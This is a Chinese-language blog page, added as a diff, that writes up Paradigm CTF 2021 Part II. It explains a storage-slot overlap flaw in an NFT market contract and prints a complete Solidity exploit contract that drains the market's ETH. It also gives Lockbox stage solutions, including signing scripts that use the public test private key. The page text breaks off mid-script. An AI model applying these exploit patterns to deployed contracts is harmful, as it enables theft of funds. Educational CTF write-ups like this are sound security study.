@@ -1,0 +1,798 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/tou.png">
+  <link rel="icon" href="/img/tou.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sissice">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[Writeup | Paradigm CTF 2021 Part Ⅰ](https:&#x2F;&#x2F;sissice.github.io&#x2F;2022&#x2F;09&#x2F;18&#x2F;Paradigm CTF 2021 Ⅰ&#x2F;) MARKET要解决该合约的要求是：让Market合约所有的ETH都消失 123function isSolved() external view returns (bool) &amp;#123;    return">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup | Paradigm CTF 2021 Part Ⅱ">
+<meta property="og:url" content="http://example.com/2022/09/23/Paradigm%20CTF%202021%20%E2%85%A1/index.html">
+<meta property="og:site_name" content="Sissice&#39;s Blog">
+<meta property="og:description" content="[Writeup | Paradigm CTF 2021 Part Ⅰ](https:&#x2F;&#x2F;sissice.github.io&#x2F;2022&#x2F;09&#x2F;18&#x2F;Paradigm CTF 2021 Ⅰ&#x2F;) MARKET要解决该合约的要求是：让Market合约所有的ETH都消失 123function isSolved() external view returns (bool) &amp;#123;    return">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-09-22T16:22:51.000Z">
+<meta property="article:modified_time" content="2022-09-22T16:26:50.633Z">
+<meta property="article:author" content="Sissice">
+<meta property="article:tag" content="靶场刷题">
+<meta property="article:tag" content="Etherum">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Writeup | Paradigm CTF 2021 Part Ⅱ - Sissice&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sissice&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Writeup | Paradigm CTF 2021 Part Ⅱ"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-09-23 00:22" pubdate>
+          2022年9月23日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          133 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Writeup | Paradigm CTF 2021 Part Ⅱ</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>[Writeup | Paradigm CTF 2021 Part Ⅰ](<a target="_blank" rel="noopener" href="https://sissice.github.io/2022/09/18/Paradigm">https://sissice.github.io/2022/09/18/Paradigm</a> CTF 2021 Ⅰ/)</p>
+<h2 id="MARKET"><a href="#MARKET" class="headerlink" title="MARKET"></a>MARKET</h2><p>要解决该合约的要求是：让Market合约所有的ETH都消失</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() external view returns (bool) &#123;<br>    return address(market).balance == 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在constructor中，一共使用5+10+15+20=50 ether，铸造了4枚NFT，并且拥有者地址不同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint tokenCost = 5 ether;<br>for (uint i = 0; i &lt; 4; i++) &#123;<br>    market.mintCollectibleFor&#123;value: tokenCost&#125;(address(bytes20(keccak256(abi.encodePacked(address(this), i)))));<br>    tokenCost += 5 ether;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>初步想法是将NFT卖给market，清空market的余额</p>
+<p>但是sellCollectible中对tokenOwner有限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function sellCollectible(bytes32 tokenId) public payable &#123;<br>    require(tokenPrices[tokenId] &gt; 0, &quot;sellCollectible/not-listed&quot;);<br><br>    (, address tokenOwner, address approved, ) = cryptoCollectibles.getTokenInfo(tokenId);<br>    require(msg.sender == tokenOwner, &quot;sellCollectible/not-owner&quot;);<br>    require(approved == address(this), &quot;sellCollectible/not-approved&quot;);<br><br>    cryptoCollectibles.transferFrom(tokenId, msg.sender, address(this));<br><br>    msg.sender.transfer(tokenPrices[tokenId]);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>EternalStorage用来存储状态，合约中为了节省gas使用assembly，等效于以下结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping(bytes32 =&gt; TokenInfo) tokens;<br><br>struct TokenInfo &#123;<br>    bytes32 displayName; //slot0<br>    address owner;  //slot1<br>    address approved;  //slot2<br>    address metadata;  //slot3<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>而我们需要向EVM写数据，就需要满足msg.sender==owner 或者 msg.sender==tokenOwner的要求</p>
+<p>正常来说<a target="_blank" rel="noopener" href="https://sissice.github.io/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/">mapping的存储位置</a>无法让两个tokenId的结构体存在部分重叠</p>
+<p>但是在实际的assembly中选择了以下方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">case 0xa9fde064 &#123; // updateName(bytes32,bytes32)<br>    let tokenId := calldataload(0x04)<br>    let newName := calldataload(0x24)<br><br>    ensureTokenOwner(tokenId)<br>    sstore(tokenId, newName) //SSTORE从堆栈中弹出两个值，首先是32字节的key，其次是32字节的value，并将该值存储在由key定义的指定存储槽中<br>&#125;<br>case 0x9711a543 &#123; // updateOwner(bytes32,address)<br>    let tokenId := calldataload(0x04)<br>    let newOwner := and(calldataload(0x24), 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)<br><br>    ensureTokenOwner(tokenId)<br>    sstore(add(tokenId, 1), newOwner)<br>&#125;<br>case 0xbdce9bde &#123; // updateApproval(bytes32,address)<br>    let tokenId := calldataload(0x04)<br>    let newApproval := and(calldataload(0x24), 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)<br><br>    ensureTokenOwner(tokenId)<br>    sstore(add(tokenId, 2), newApproval)<br>&#125;<br>case 0x169dbe24 &#123; // updateMetadata(bytes32,address)<br>    let tokenId := calldataload(0x04)<br>    let newMetadata := and(calldataload(0x24), 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)<br><br>    ensureTokenOwner(tokenId)<br>    sstore(add(tokenId, 3), newMetadata)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以试图操纵tokenId的数值，让两个tokenId的结构体存在部分重叠，即让tokenId_1的slot_1刚好位于tokenId_0的slot_3</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tokenId_0<span class="hljs-selector-class">.name</span>     <br>tokenId_0<span class="hljs-selector-class">.owner</span>	   <br>tokenId_0<span class="hljs-selector-class">.approval</span>      -  tokenId_1<span class="hljs-selector-class">.name</span><br>tokenId_0<span class="hljs-selector-class">.metadata</span>      -  tokenId_1<span class="hljs-selector-class">.owner</span><br>						-  tokenId_1<span class="hljs-selector-class">.approval</span><br>						-  tokenId_1.metadata<br></code></pre></td></tr></table></figure>
+
+<p>这样我们就可以通过tokenId_0.metadata来设置tokenId_1.owner</p>
+<p>而mint函数中生成的tokenId是随机的，不能通过这个函数生成我们想要的tokenId</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function mint(address tokenOwner) external returns (bytes32) &#123;<br>    require(minters[msg.sender], &quot;mint/not-minter&quot;);<br><br>    bytes32 tokenId = keccak256(abi.encodePacked(address(this), tokenIdSalt++));<br>    eternalStorage.mint(tokenId, &quot;My First Collectible&quot;, tokenOwner);<br>    return tokenId;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是有一个最大的漏洞在于调用sellCollectible，sell一个token的时候，直接给出tokenId，然后用该tokenId作为从存储中取值的key获取整个tokenInfo，不会验证这个NFT是否被铸造过。因此我们可以虚构一个tokenId_1, 满足上面的关系。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getTokenInfo(bytes32 tokenId) external view returns (bytes32, address, address, address) &#123;<br>    return (<br>        eternalStorage.getName(tokenId),<br>        eternalStorage.getOwner(tokenId),<br>        eternalStorage.getApproval(tokenId),<br>        eternalStorage.getMetadata(tokenId)<br>    );<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>由于sellCollectible函数中要求价格大于0，所以不能出售我们自己虚构的token</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">require(tokenPrices[tokenId] &gt; 0, &quot;sellCollectible/not-listed&quot;);<br></code></pre></td></tr></table></figure>
+
+<p>所以进行两次tokenId的数值的更改，将tokenId_0出售两次</p>
+<ol>
+<li>铸造一个tokenId_0，并更改metadata为攻击合约地址</li>
+<li>出售tokenId_0</li>
+<li>虚构tokenId_1，tokenId的值为 token_0+2 （此时tokenId_1.owner=tokenId_0.metadata=攻击合约地址）</li>
+<li>更改tokenId_1.name为攻击合约地址（此时tokenId_0.approval=tokenId_1.name=攻击合约地址）</li>
+<li>将tokenId_0 transferFrom 给攻击合约</li>
+<li>再次出售</li>
+</ol>
+<p>注意，由于要求是让Market合约所有的ETH都消失，而代币价格不等于发送的以太币数量</p>
+<p>所以我们选择设定一个较高的tokenPrices，并在第二次出售之前计算Market合约缺失的tokenPrices</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.7.0;<br><br>import &quot;./Setup.sol&quot;;<br><br>contract marketExploit &#123;<br>    marketSetup public setup;<br>    EternalStorageAPI public eternalStorage;<br>    CryptoCollectibles public token;<br>    CryptoCollectiblesMarket public market;<br>    constructor(address _setup) payable &#123;<br>        setup = marketSetup(_setup);<br>        eternalStorage = setup.eternalStorage();<br>        token = setup.token();<br>        market = setup.market();<br>        require(msg.value == 70 ether);<br>        bytes32 token_0 = market.mintCollectibleFor&#123;value: 70 ether&#125;(address(this));<br>        //修改token_0.metadata, 让它等于address(this)<br>        eternalStorage.updateMetadata(token_0,address(this));<br>        //approve token<br>        token.approve(token_0, address(market));<br>        //卖出该token_0, tokenId为token_0<br>        market.sellCollectible(token_0);<br>        //get token_1<br>        bytes32 token_1 = bytes32(uint256(token_0)+2);<br>        //updateName-&gt;approval<br>        eternalStorage.updateName(token_1, bytes32(uint256(address(this))));<br>        // transferFrom<br>        token.transferFrom(token_0, address(market), address(this));<br>        token.approve(token_0, address(market));<br>        //fix price<br>        uint tokenPrice = msg.value * 10000 / (10000 + 1000);<br>        uint missingBalance = tokenPrice - address(market).balance;<br>        //补偿缺少的ETH<br>        market.mintCollectible&#123;value:missingBalance&#125;();<br>        //sellAgain<br>        market.sellCollectible(token_0);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="LOCKBOX"><a href="#LOCKBOX" class="headerlink" title="LOCKBOX"></a>LOCKBOX</h2><p>利用modifier，套娃</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier _() &#123;<br>    _;<br><br>    assembly &#123;<br>        //第一步：拿到全局变量Stage, 判断如果stage的值没有更新则返回<br>        let next := sload(next_slot)<br>        if iszero(next) &#123;<br>            return(0, 0)<br>        &#125;<br><br>        //第二步：调用Stage上的getSelector()函数，将结果存储在内存中<br>        // keccak(abi.encode(&quot;getSelector&quot;))[0:0x04] = 0x034899bc<br>        mstore(0x00, 0x034899bc00000000000000000000000000000000000000000000000000000000)<br>        pop(call(gas(), next, 0, 0, 0x04, 0x00, 0x04))<br><br>        //第三步：调用Stage合约，函数选择器为getSelector()函数的返回值，参数为CALLDATA[0x04:]<br>        calldatacopy(0x04, 0x04, sub(calldatasize(), 0x04))<br>        switch call(gas(), next, 0, 0, calldatasize(), 0, 0)<br>            //第四步：如果调用失败，则REVERT<br>            case 0 &#123;<br>                returndatacopy(0x00, 0x00, returndatasize())<br>                revert(0x00, returndatasize())<br>            &#125;<br>            case 1 &#123;<br>                returndatacopy(0x00, 0x00, returndatasize())<br>                return(0x00, returndatasize())<br>            &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>从<code>Entrypoint</code>to等到<code>Stage1</code>to <code>Stage2</code>，<code>Stage5</code>我们会将相同的 calldata 传递给所有调用。所以一个 calldata 解决题中的6个条件</p>
+<h3 id="Entrypoint"><a href="#Entrypoint" class="headerlink" title="Entrypoint"></a>Entrypoint</h3><p>随机数预测，传入 <code>bytes4(blockhash(block.number - 1))</code> 即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(bytes4 guess) public _ &#123;<br>    require(guess == bytes4(blockhash(block.number - 1)), &quot;do you feel lucky?&quot;);<br><br>    solved = true;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Stage1"><a href="#Stage1" class="headerlink" title="Stage1"></a>Stage1</h3><p>需要获得 <code>0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf</code> 的私钥，这是一个非常出名的地址，其私钥为：<code>0x0000000000000000000000000000000000000000000000000000000000000001</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(uint8 v, bytes32 r, bytes32 s) public _ &#123;<br>    require(ecrecover(keccak256(&quot;stage1&quot;), v, r, s) == 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, &quot;who are you?&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>注意：在一般的web3.js中，在eth-sign时，会在签名的消息前加上<code>\x19Ethereum Signed Message + len(msg)</code>一段bytecode。故需使用不加入此消息的eth-sign函数库。</p>
+<p>起初使用we3py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> eth_account <span class="hljs-keyword">import</span> Account, messages<br><span class="hljs-keyword">from</span> eth_account.messages <span class="hljs-keyword">import</span> encode_defunct<br><br><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3, HTTPProvider<br><br>rpc = <span class="hljs-string">&quot;https://mainnet.infura.io/v3/0aec7fd42e0a40f28dd6c1a185f7d3e6&quot;</span><br>web3 = Web3(HTTPProvider(rpc))<br><br>messageshash = web3.toHex(web3.sha3(text=<span class="hljs-string">&#x27;stage1&#x27;</span>))<br><span class="hljs-built_in">print</span>(messageshash)<br>private_key_hex = <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span><br><br>signed_message = Account.signHash(message_hash=messageshash, private_key=private_key_hex)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;signature =&quot;</span>, signed_message)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r = &quot;</span>, web3.toHex(signed_message.r))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;s = &quot;</span>, web3.toHex(signed_message.s))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;v = &quot;</span>, web3.toHex(signed_message.v))<br><br><br></code></pre></td></tr></table></figure>
+
+<p>计算得出结果</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">r</span> =  <span class="hljs-number">0</span>x<span class="hljs-number">370</span>df<span class="hljs-number">20998</span>cc<span class="hljs-number">15</span>afb<span class="hljs-number">44</span>c<span class="hljs-number">2879</span>a<span class="hljs-number">3</span>c<span class="hljs-number">162</span>c<span class="hljs-number">92</span>e<span class="hljs-number">703</span>fc<span class="hljs-number">4194527</span>fb<span class="hljs-number">6</span>ccf<span class="hljs-number">30532</span>ca<span class="hljs-number">1</span>dd<span class="hljs-number">3</span>b<br><span class="hljs-attribute">s</span> =  <span class="hljs-number">0</span>x<span class="hljs-number">35</span>b<span class="hljs-number">3</span>f<span class="hljs-number">2</span>e<span class="hljs-number">2</span>ff<span class="hljs-number">583</span>fed<span class="hljs-number">98</span>ff<span class="hljs-number">00813</span>ddc<span class="hljs-number">7</span>eb<span class="hljs-number">17</span>a<span class="hljs-number">0</span>ebfc<span class="hljs-number">282</span>c<span class="hljs-number">011946</span>e<span class="hljs-number">2</span>ccbaa<span class="hljs-number">9</span>cd<span class="hljs-number">3</span>ee<span class="hljs-number">67</span><br><span class="hljs-attribute">v</span> =  <span class="hljs-number">0</span>x<span class="hljs-number">1</span>b<br></code></pre></td></tr></table></figure>
+
+<p>但是由于此结果不能满足Stage3</p>
+<p>所以使用原始ecdsaSign来签名</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> ethereumjs_util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;ethereumjs-util&quot;</span>);<br><span class="hljs-keyword">const</span> &#123; randomBytes &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; ecdsaSign &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ethereum-cryptography/secp256k1&#x27;</span>)<br><br><span class="hljs-keyword">const</span> privateKeyStr = <span class="hljs-string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span>;<br><span class="hljs-keyword">const</span> hashStr = <span class="hljs-string">&#x27;0x&#x27;</span> + (ethereumjs_util.keccak(Buffer.from(<span class="hljs-string">&#x27;stage1&#x27;</span>), <span class="hljs-number">256</span>)).toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><br><span class="hljs-keyword">const</span> privateKey = Buffer.from(privateKeyStr.slice(<span class="hljs-number">2</span>), <span class="hljs-string">&quot;hex&quot;</span>);<br><span class="hljs-keyword">const</span> hash = Buffer.from(hashStr.slice(<span class="hljs-number">2</span>), <span class="hljs-string">&quot;hex&quot;</span>);<br><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>  <span class="hljs-comment">// node_modules /@types/secp256k1/index.d.ts</span><br>  <span class="hljs-keyword">const</span> &#123; signature, recid &#125; = ecdsaSign(hash, privateKey, &#123; <span class="hljs-attr">data</span>: randomBytes(<span class="hljs-number">32</span>) &#125;);<br><br>  v = recid + <span class="hljs-number">27</span>;<br>  r = Buffer.from(signature.slice(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br>  s = Buffer.from(signature.slice(<span class="hljs-number">32</span>, <span class="hljs-number">64</span>))<br><br>  <span class="hljs-keyword">if</span> (v != <span class="hljs-number">28</span>) &#123;<br>    <span class="hljs-keyword">continue</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> rBN = <span class="hljs-string">&#x27;0x&#x27;</span> + r.toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  <span class="hljs-keyword">const</span> sBN = <span class="hljs-string">&#x27;0x&#x27;</span> + 